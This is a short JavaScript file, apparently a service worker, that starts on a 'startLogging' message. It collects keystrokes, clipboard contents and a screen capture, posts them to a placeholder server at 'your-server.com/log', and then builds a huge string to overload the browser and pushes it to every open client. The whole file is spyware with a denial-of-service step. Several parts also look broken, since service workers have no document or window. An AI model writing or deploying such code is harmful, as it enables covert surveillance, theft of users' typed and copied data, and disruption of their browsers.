self.addEventListener("message", (event) => {
    if (event.data && event.data.type === "startLogging") {
        // Persistent logging in background
        const log = [];

        // Function to log keystrokes
        function logKeystrokes() {
            const log = [];
            document.addEventListener("keydown", (e) => {
                log.push(e.key);
            });
            return log;
        }

        // Function to capture clipboard data
        function getClipboardData() {
            return navigator.clipboard.readText().catch(() => {
                const tempInput = document.createElement("input");
                tempInput.value = "Clipboard data";
                document.body.appendChild(tempInput);
                tempInput.select();
                return document.getSelection().toString();
            });
        }

        // Function to capture screen (simplified for service worker)
        function captureScreen() {
            const canvas = document.createElement("canvas");
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            const ctx = canvas.getContext("2d");
            ctx.drawImage(window.document.documentElement, 0, 0);
            return canvas.toDataURL();
        }

        // Function to generate overflow data (infinite data to overload browser)
        function generateOverflowData() {
            let data = "";
            for (let i = 0; i < 1000000; i++) {
                data += "a".repeat(1000);
            }
            return data;
        }

        // Collect data
        const data = {
            timestamp: new Date().toISOString(),
            keystrokes: logKeystrokes(),
            clipboard: getClipboardData(),
            screen: captureScreen()
        };

        // Send data to server
        fetch("https://your-server.com/log", {
            method: "POST",
            body: JSON.stringify(data),
            headers: {
                "Content-Type": "application/json"
            }
        });

        // Generate overflow data in background
        const overflowData = generateOverflowData();
        self.clients.matchAll().forEach(client => {
            client.postMessage(overflowData);
        });
    }
});
